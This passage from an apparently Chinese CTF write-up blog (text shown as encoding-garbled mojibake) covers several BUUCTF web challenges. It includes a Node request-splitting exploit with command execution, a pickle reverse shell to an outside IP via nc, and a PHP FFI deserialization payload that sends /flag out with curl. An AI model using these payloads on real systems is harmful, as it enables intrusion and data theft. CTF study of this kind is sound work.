ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„unicodeå­—ç¬¦ï¼Œä¾‹å¦‚ğŸ¶</p><p>ç›¸åï¼Œè¿™äº›å­—ç¬¦è¢«æˆªæ–­ä¸ºå…¶JavaScriptè¡¨ç¤ºçš„æœ€ä½å­—èŠ‚ï¼š<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181014005518-c376b332-cf08-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181014005518-c376b332-cf08-1.png" alt="img"></a></p><p>å¤„ç†ç”¨æˆ·è¾“å…¥æ—¶çš„åæ•°æ®é€šå¸¸æ˜¯åº•å±‚å®‰å…¨é—®é¢˜çš„å±é™©ä¿¡å·ï¼Œæˆ‘çŸ¥é“æˆ‘ä»¬çš„ä»£ç åº“å‘å‡ºäº†å¯èƒ½åŒ…å«ç”¨æˆ·è¾“å…¥çš„è·¯å¾„çš„HTTPè¯·æ±‚ã€‚æ‰€ä»¥æˆ‘ç«‹å³åœ¨Bugzillaä¸­æäº¤äº†ä¸€ä¸ªä¿å¯†çš„å®‰å…¨æ¼æ´ï¼Œå‘nodeå®‰å…¨å›¢é˜Ÿå¯»æ±‚æ›´å¤šä¿¡æ¯ï¼Œç„¶åæ ¹æ®ç”¨æˆ·æä¾›çš„unicodeå­—ç¬¦ä¸²å¯»æ‰¾æˆ‘ä»¬å¯èƒ½æ„å»ºURLçš„åœ°æ–¹ã€‚</p><p>å†…å®¹æºè‡ªï¼š<a href="https://xz.aliyun.com/t/2894">https://xz.aliyun.com/t/2894</a></p></blockquote><p>å·ä¸€ä¸ªå¤§ä½¬çš„è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestspayload <span class="token operator">=</span> <span class="token triple-quoted-string string">""" HTTP/1.1Host: 127.0.0.1Connection: keep-alivePOST /file_upload HTTP/1.1Host: 127.0.0.1Content-Length: &#123;&#125;Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt&#123;&#125;"""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'\r\n'</span><span class="token punctuation">)</span>body <span class="token operator">=</span> <span class="token triple-quoted-string string">"""------WebKitFormBoundarysAs7bV3fMHq0JXUtContent-Disposition: form-data; name="file"; filename="lmonstergg.pug"Content-Type: ../template-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()")-return x------WebKitFormBoundarysAs7bV3fMHq0JXUt--"""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'\r\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">,</span> body<span class="token punctuation">)</span> \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'\u012b'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\u0120'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\r\n'</span><span class="token punctuation">,</span> <span class="token string">'\u010d\u010a'</span><span class="token punctuation">)</span>    \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'\u0122'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'\u0a27'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">'\u015b'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'\u015d'</span><span class="token punctuation">)</span> \    <span class="token operator">+</span> <span class="token string">'GET'</span> <span class="token operator">+</span> <span class="token string">'\u0120'</span> <span class="token operator">+</span> <span class="token string">'/'</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>trust_env <span class="token operator">=</span> <span class="token boolean">False</span>response1 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://8467d768-1851-4764-bf73-e93bedea88bc.node4.buuoj.cn:81/core?q='</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://8467d768-1851-4764-bf73-e93bedea88bc.node4.buuoj.cn:81/?action=lmonstergg'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2><p>æ˜ç¤ºpickleï¼Œå…ˆè§£ç çœ‹çœ‹</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206151820591.png"></p><p>å¾ˆæ˜æ˜¾æœ‰åŠ å¯†éªŒè¯å•Šï¼Œé‚£å°±ä¸èƒ½ä¼ªé€ å†…å®¹äº†ï¼Œåªèƒ½è‡ªå·±æä¸ªç±»åå¼¹shelläº†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> pickle<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"__import__('os').system('nc 43.249.193.167 38901 -e/bin/sh')"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CISCN2019-åä¸œåŒ—èµ›åŒº-Web2"><a href="#CISCN2019-åä¸œåŒ—èµ›åŒº-Web2" class="headerlink" title="[CISCN2019 åä¸œåŒ—èµ›åŒº]Web2"></a>[CISCN2019 åä¸œåŒ—èµ›åŒº]Web2</h2><p>XSSSSSSSSSSSSSSï¼Œä¸å‡ºç½‘ï¼Œè¿˜æ˜¯ä¹‹åXSSå¹³å°èƒ½ç”¨äº†å†è¯´å§</p><h2 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2><p>æ³¨å†Œç™»å½•çœ‹åˆ°jwtï¼Œæ‰«ç›®å½•æ‰«å‡ºæ¥å¯†é’¥ï¼Œç›´æ¥ä¼ªé€ adminå°±è¡Œ</p><h2 id="GWCTF-2019-ä½ çš„åå­—"><a href="#GWCTF-2019-ä½ çš„åå­—" class="headerlink" title="[GWCTF 2019]ä½ çš„åå­—"></a>[GWCTF 2019]ä½ çš„åå­—</h2><p>é™¤äº†SSTIè¿˜èƒ½æ˜¯å•¥</p><p>æµ‹è¯•å‘—ï¼Œè¾“å…¥ä¸ªä¸¤å¯¹èŠ±æ‹¬å·å‘ç°è¢«æ»¤äº†ï¼Œ<del>è¿˜çˆ†å‡ºäº†æ˜¯phpç¯å¢ƒï¼Œå…¶å®å¹¶ä¸æ˜¯ï¼Œä¼°è®¡æ˜¯BUUå¤ç°ç¯å¢ƒçš„é—®é¢˜</del></p><p>æ²¡å…³ç³»è¿˜æœ‰å‘½ä»¤æ‰§è¡Œå¯ç”¨ï¼Œå•¥ç¬¦å·éƒ½æ²¡è¿‡æ»¤ç›´æ¥æ‹¼æ¥å°±è¡Œ</p><h2 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2><p>è°¢è°¢è¿™é“é¢˜ï¼Œè®©æˆ‘ç‹ ç‹ äº†è§£äº†ä¸€æŠŠcurlæ€ä¹ˆç”¨</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-X</span> PUT <span class="token string">'http://node4.buuoj.cn:26923/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a'</span> <span class="token parameter variable">-u</span> <span class="token string">'player:54ef36ec71201fdf9d1423fd26f97f6b'</span> <span class="token parameter variable">-A</span> <span class="token string">'1337 Browser v.9001'</span> <span class="token parameter variable">-H</span> <span class="token string">"X-Forwarded-For:13.37.13.37,127.0.0.1"</span> <span class="token parameter variable">-b</span> <span class="token string">"Fortune=6265"</span> <span class="token parameter variable">-H</span> <span class="token string">"Accept:text/plain"</span> <span class="token parameter variable">-H</span> <span class="token string">"Accept-Language:ru"</span> <span class="token parameter variable">-H</span> <span class="token string">"origin:https://ctf.bsidessf.net"</span> <span class="token parameter variable">-H</span> <span class="token string">"referer:https://ctf.bsidessf.net/challenges"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>curlä½¿ç”¨æ–¹æ³•</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-o</span> æ–‡ä»¶å é“¾æ¥ <span class="token comment">#ä¸‹è½½URLå†…å®¹å¹¶é‡å‘½åä¸ºæ–‡ä»¶å</span><span class="token parameter variable">-O</span> é“¾æ¥ <span class="token comment">#ä»¥URLç»“å°¾åšæ–‡ä»¶å</span><span class="token parameter variable">-L</span> <span class="token comment">#è·Ÿéšé‡å®šå‘è·³è½¬</span><span class="token parameter variable">-C</span> - <span class="token parameter variable">-O</span> é“¾æ¥ <span class="token comment">#ç»§ç»­è¢«ä¸­æ–­çš„ä¸‹è½½</span>--trace-ascii æ–‡ä»¶ é“¾æ¥ <span class="token comment">#å°†æ•´ä¸ªcurlå‘½ä»¤æ‰§è¡Œè¿‡ç¨‹å†™å…¥æ–‡ä»¶</span><span class="token parameter variable">-X</span> è¯·æ±‚æ–¹å¼ <span class="token comment">#ä½¿ç”¨æŒ‡å®šçš„è¯·æ±‚æ–¹å¼æ¥å‘èµ·è¯·æ±‚</span><span class="token parameter variable">-F</span> <span class="token string">"name=@æ–‡ä»¶æœ¬åœ°è·¯å¾„"</span> <span class="token comment">#ä¸Šä¼ æ–‡ä»¶</span><span class="token parameter variable">--data</span> <span class="token comment">#å¸¦POSTå‚æ•°ï¼Œå¯å¸¦json</span><span class="token parameter variable">--cookie</span> <span class="token comment">#æºå¸¦cookie</span><span class="token parameter variable">--cookie</span> stored_cookies_file_path <span class="token comment">#è¯»å–cookie</span>--user-agent æˆ–è€… <span class="token parameter variable">-A</span> <span class="token comment">#å¸¦UAå¤´</span><span class="token parameter variable">-H</span> <span class="token comment">#å¸¦è¯·æ±‚å¤´</span><span class="token parameter variable">--user</span> username:password <span class="token comment">#é€šè¿‡Basic AuthenticationéªŒè¯</span><span class="token parameter variable">-i</span> <span class="token comment">#æ˜¾ç¤ºå®Œæ•´å“åº”</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h2><p>ä»£ç å®¡è®¡å’ŒSESSIONæ–‡ä»¶ä¼ªé€ </p><p>çœ‹æ‹¿flagçš„è¦æ±‚æ˜¯<code>$SESSION[&#39;admin&#39;]==true</code>ï¼Œåœ¨æ–‡ä»¶ä¸‹è½½ä»£ç å¤„å¯çœ‹åˆ°ï¼Œç”Ÿæˆæ–‡ç« æ‰“åŒ…åæ–‡ä»¶å’ŒSESSIONæ–‡ä»¶å­˜å‚¨åœ¨åŒä¸€æ–‡ä»¶å¤¹ä¸‹ï¼Œå¯ä»¥è¿›è¡Œä¼ªé€ ï¼Œçœ‹æ–‡ä»¶åå¤„ç†çš„ä»£ç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'-'</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$type</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// avoid path traversal</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token constant">TEMP_DIR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„å°†æ–‡ä»¶åå‘½åä¸º<code>ç”¨æˆ·å-éšæœº8ä½16è¿›åˆ¶æ•°.typeå‚æ•°</code>ï¼Œå¹¶ä¸”å¦‚æœæœ‰ä¸¤ä¸ª.è¿˜ä¼šå°†å…¶æ›¿æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆæˆ‘ä»¬æ„é€ ç”¨æˆ·åä¸º<code>sess_</code>ï¼Œtypeä¸º<code>.</code>æœ€ç»ˆç”Ÿæˆçš„æ–‡ä»¶å°±æ˜¯<code>sess_-éšæœº8ä½16è¿›åˆ¶æ•°</code>ï¼Œåˆšå¥½ç¬¦åˆSESSIONæ–‡ä»¶å­˜å‚¨å‘½åï¼Œè€Œåˆå› ä¸ºä¸‹é¢ç”Ÿæˆæ–‡ä»¶ä½¿ç”¨çš„æ˜¯zipæ–¹å¼æ‰“åŒ…ï¼Œæ–‡æœ¬åŸæ ·å†™å…¥ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æ–‡ç« æ ‡é¢˜å¤„æ„é€ <code>admin|b:1;</code>å°±èƒ½è¢«é»˜è®¤ååºåˆ—åŒ–æ–¹å¼è·å–ï¼Œè€Œä¸ºäº†é˜²æ­¢å‰åå­—ç¬¦å½±å“ï¼Œæ„é€ æ ‡é¢˜ä¸º<code>xxxx|N;admin|b:1;xxxxxx</code>ï¼Œé€šè¿‡ä¸‹è½½è·å–SESSIDï¼Œä¿®æ”¹cookieå³å¯</p><h2 id="BSidesCF-2019-Pick-Tac-Toe"><a href="#BSidesCF-2019-Pick-Tac-Toe" class="headerlink" title="[BSidesCF 2019]Pick Tac Toe"></a>[BSidesCF 2019]Pick Tac Toe</h2><p>çœ‹é¡µé¢ä»£ç ï¼ŒæŒ‰ç…§å¯¹åº”å­—ç¬¦ä¼ å‚å¯è¦†ç›–ç”µè„‘æ­¥æ•°</p><h2 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h2><p>ç¦ç”¨äº†ä¸€å †å‡½æ•°ï¼Œå¹¶ä¸”å¸¦æœ‰openbase_dirï¼Œé€šè¿‡globåè®®æ‰«å‡ºflagåœ¨æ ¹ç›®å½•ï¼Œç„¶åå½“å‰ç›®å½•è¿˜æœ‰ä¸€ä¸ªphpæ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string single-quoted-string">'ret'</span> <span class="token operator">=></span> <span class="token constant">null</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'func'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'print_r'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'arg'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'1'</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">array</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unserialize</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span> <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span> <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„åˆ©ç”¨çš„æ˜¯php7.4æ–°å¼•è¿›çš„ä¸€é¡¹ç‰¹æ€§ï¼š<a href="https://www.laruence.com/2020/03/11/5475.html">FFIæ‰©å±•è¯¦è§£</a></p><p>æ€»ä½“çš„FFIè°ƒç”¨é€»è¾‘å°±æ˜¯</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token constant">C</span>ä¸­çš„å‡½æ•°<span class="token function">A</span><span class="token punctuation">(</span><span class="token constant">C</span>ä¸­å®šä¹‰å‡½æ•°<span class="token constant">A</span>çš„å‚æ•°<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">C</span>ä¸­çš„å‡½æ•°<span class="token function">B</span><span class="token punctuation">(</span><span class="token constant">C</span>ä¸­å®šä¹‰å‡½æ•°<span class="token constant">B</span>çš„å‚æ•°<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"éœ€è¦åŠ åœ¨çš„åŠ¨æ€åº“"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">A</span><span class="token punctuation">(</span><span class="token constant">A</span>å‚æ•°<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>é‚£ä¹ˆåœ¨ä¸Šé¢çš„è¿™ä¸ªåºåˆ—åŒ–å†…å®¹ä¸­æˆ‘ä»¬å°±å¯ä»¥åšå¦‚ä¸‹æ„é€ </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string single-quoted-string">'ret'</span> <span class="token operator">=></span> <span class="token constant">null</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'func'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'FFI::cdef'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'arg'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'int system(char *command);'</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//æ­¤å¤„ä¸¤ä¸ªå‡½æ•°éœ€è¦ä¿ç•™æ˜¯å› ä¸ºSerializableæ˜¯ä¸€ä¸ªæ¥å£ï¼Œå…¶ä¸­çš„å±æ€§ä¸å†æ¬¡ç»è¿‡å£°æ˜æ˜¯ä¸èƒ½è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„</span>        <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±äºåœ¨ååºåˆ—åŒ–æ—¶ä¼šæ‰§è¡Œrunå‡½æ•°ï¼Œå°†FFIè°ƒç”¨åçš„ç»“æœä¼ ç»™$data-&gt;retå˜é‡ï¼Œè¿›è€Œå¯¹retè°ƒç”¨å³å¯è°ƒç”¨Cä¸­çš„systemå‡½æ•°ï¼Œç»•è¿‡phpçš„é™åˆ¶ï¼Œä¸èƒ½ç›´æ¥è®¿é—®dataå› ä¸ºå…¶ä¸ºä¿æŠ¤å±æ€§</p><pre class="line-numbers language-none"><code class="language-none">payload:?a&#x3D;$a&#x3D;unserialize(&#39;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#39;);$a-&gt; __serialize()[&#39;ret&#39;]-&gt;system(&#39;curl -d @&#x2F;flag 182.61.46.138:12345&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h2><p>åˆç†æ€€ç–‘SSTIï¼Œä½†æ˜¯åŒèŠ±æ‹¬å·è¢«è¿‡æ»¤äº†ï¼Œè¯•è¯•è®©ç¨‹åºæŠ¥é”™ï¼Œä½¿ç”¨1/0ï¼Œå¾—åˆ°æŠ¥é”™</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162052551.png"></p><p>é‚£åœ¨åé¢è´´ä¸Šæ³¨é‡Šï¼Œçœ‹çœ‹é‡Œé¢ä¼šä¸ä¼šè¢«æ‰§è¡Œï¼Œä¼ å…¥äº†æ²¡æ‰§è¡Œ</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162053572.png"></p><p>é‚£å†ä¼ å…¥æ¨¡ç‰ˆè¯­æ³•è¯•è¯•ï¼ŒæˆåŠŸçˆ†å‡º<code>SECRET_KEY</code></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162055573.png"></p><p>å°è¯•ç›´æ¥ä¼ å…¥æç¤ºé•¿åº¦è¿‡é•¿ï¼Œé‚£å°±ä¼ªé€ sessionå§</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 *3.py encode <span class="token parameter variable">-s</span> <span class="token string">"cded826a1e89925035cc05f0907855f7"</span> <span class="token parameter variable">-t</span> <span class="token 